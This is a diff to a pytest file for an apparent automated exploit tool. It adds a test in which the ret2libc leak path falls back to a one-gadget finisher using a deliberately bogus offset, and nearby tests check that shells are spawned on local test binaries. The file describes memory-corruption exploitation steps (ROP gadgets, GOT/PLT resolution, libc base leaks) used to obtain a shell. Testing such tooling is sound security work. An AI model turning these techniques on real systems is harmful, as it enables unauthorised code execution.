@@ -8,7 +8,6 @@ import struct
 import subprocess
 
 import pytest
-
 from lykos.analyze.poc import leak, rop
 
 _SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
@@ -111,6 +110,30 @@ def test_ret2libc_leak_spawns_a_shell(r2l_bin):
                              timeout=8.0)
     assert res["ok"], f"ret2libc did not confirm a shell: {res.get('reason')} (leaked={res.get('leaked')})"
     assert res["base"] % 0x1000 == 0                     # a real, page-aligned libc base was recovered
+    assert res["technique"] == "ret2libc"                # the system() finisher, tried first
+
+
+def test_ret2libc_leak_tries_the_one_gadget_finisher(r2l_bin):
+    """With system() disabled, the leak path falls back to the one-gadget finisher: it must attempt
+    a one-gadget candidate (re-triggering the overflow with a single-jump libc address) rather than
+    give up at the leak. A bogus candidate cannot spawn a shell, so this asserts the path RUNS and
+    declines cleanly -- a real one-gadget confirmation depends on the loaded libc actually having
+    a pattern-matchable one-gadget (common on older/CTF glibc; find_one_gadgets is unit-tested)."""
+    from lykos.analyze.poc import exploit
+    data = r2l_bin.read_bytes()
+    pop_rdi = rop.find_gadget(data, "pop_rdi")
+    puts_plt = rop.resolve_plt(str(r2l_bin), "puts")
+    puts_got = rop.got_entry(data, "puts")
+    main = exploit.elf_functions(data).get("main")
+    ld = open(_SYS_LIBC, "rb").read()
+    puts_off = rop.libc_symbols(ld, ("puts",)).get("puts")
+    # a deliberately non-functional one-gadget offset: exercises the finisher build/attempt path
+    res = leak.ret2libc_leak(r2l_bin, r2l_bin.parent, offset=40, pop_rdi=pop_rdi, puts_plt=puts_plt,
+                             puts_got=puts_got, ret_to=main,
+                             ret_gadget=rop.find_gadget(data, "ret"),
+                             puts_off=puts_off, system_off=None, binsh_off=None,
+                             one_gadgets=[0x1234], timeout=6.0)
+    assert res["ok"] is False and "no finisher" in res["reason"]
 
 
 # --- integration: the exploit stage picks ret2libc-leak and files a confirmed L3 -----------------
@@ -425,6 +448,7 @@ def test_render_canary_script_reproduces_shell(canary_bin, tmp_path):
     the puts leak, and pops a shell on its own -- the canary L3 bundle is self-reproducing (it used
     to ship a placeholder that could not run)."""
     import subprocess as sp
+
     from lykos.analyze.poc import exploit as ex
     data = canary_bin.read_bytes()
     ld = open(_SYS_LIBC, "rb").read()
